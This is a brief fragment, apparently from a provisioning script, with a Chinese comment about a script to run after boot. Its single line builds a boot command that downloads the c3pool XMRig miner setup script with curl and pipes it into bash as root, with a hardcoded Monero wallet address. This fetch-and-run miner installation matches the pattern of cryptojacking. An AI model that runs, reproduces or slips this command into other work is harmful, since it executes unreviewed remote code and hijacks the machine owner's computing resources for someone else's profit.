...
# 3.创建开机后要运行的脚本
init = "export HOME=/root && curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AScEDexXTgK6HvqutXJTT3Xd6oir9hZvWXuBPxdKJF8gkUSDfRsSfEBjfcHwRGkitRo9e39zMbw79LadFcRkNayLSKR6xu"
